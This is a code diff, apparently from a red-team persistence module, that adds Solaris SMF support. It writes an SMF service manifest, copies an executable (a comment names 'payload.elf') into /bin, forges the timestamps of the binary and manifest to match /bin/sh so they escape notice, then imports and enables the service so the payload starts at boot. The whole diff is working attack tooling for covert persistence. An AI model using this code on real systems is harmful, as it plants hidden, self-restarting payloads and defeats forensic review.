@@ -206,6 +206,32 @@ status_cmd="${name}_status"
 run_rc_command "$1"
 """
 
+smf_template = """<?xml version="1.0"?>
+<!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1">
+<service_bundle type="manifest" name="system/{{ SERVICE_NAME }}">
+
+  <service name="system/{{ SERVICE_NAME }}" type="service" version="1">
+
+    <create_default_instance enabled="true"/>
+
+    <single_instance/>
+
+    <dependency name="network" grouping="require_all" restart_on="error" type="service">
+      <service_fmri value="svc:/milestone/network:default"/>
+    </dependency>
+
+    <exec_method type="method" name="start" exec="{{ SERVICE_START_CMD }}" timeout_seconds="60"/>
+
+    <exec_method type="method" name="stop" exec=":kill" timeout_seconds="60"/>
+
+    <property_group name="startd" type="framework">
+      <propval name="duration" type="astring" value="contract"/>
+    </property_group>
+
+  </service>
+</service_bundle>
+"""
+
 
 def is_using_systemd():
     command_get_res = sys.shell("command -v systemctl")
@@ -230,6 +256,11 @@ def is_using_bsdinit():
         return True
     return False
 
+def is_using_smf():
+    command_get_res = sys.shell("command -v svcadm")
+    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
+        return True
+    return False
 
 def systemd(service_name, service_desc, executable_path, executable_args):
     # assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
@@ -317,6 +348,25 @@ def launch_daemon(service_name, executable_path, executable_args):
     sys.shell("launchctl load -w /Library/LaunchDaemons/"+service_name+".plist")
     print("Launch daemon installed")
 
+def smf(service_name, executable_path, executable_args):
+    # assets.copy("persist_service/files/smf.xml.j2","/tmp/smf.xml.j2")
+    file.write("/tmp/smf.xml.j2", smf_template)
+    args = {
+        "SERVICE_NAME": service_name,
+        "SERVICE_START_CMD": f"{executable_path} {executable_args}"
+    }
+    file.template("/tmp/smf.xml.j2", "/lib/svc/manifest/system/"+service_name+".xml", args, False)
+    file.remove("/tmp/smf.xml.j2")
+
+    # assets.copy("persist_service/files/payload.elf", executable_path)
+    sys.shell(f"chmod +x {executable_path}")
+    sys.shell(f"touch -r /bin/sh {executable_path}")
+    sys.shell(f"touch -r /bin/sh /lib/svc/manifest/system/{service_name}.xml")
+
+    sys.shell(f"svccfg import /lib/svc/manifest/system/{service_name}.xml")
+    sys.shell(f"svcadm enable {service_name}")
+    print("SMF installed")
+
 
 def windows_service_manager(service_name, service_display_name, service_description, executable_path, executable_args):
     binpath = executable_path
@@ -369,6 +419,11 @@ def persist_service(service_name, service_desc, executable_name, executable_args
         if is_using_bsdinit():
             bsdinit(service_name, service_desc,
                     executable_path, executable_args)
+    elif sys.get_os()['platform'] == "Unknown: Solaris":
+        executable_path = "/bin/"+executable_name
+        file.copy(src_path, executable_path)
+        if is_using_smf():
+            smf(service_name, executable_path, executable_args)
     else:
         print("OS not supported")
 
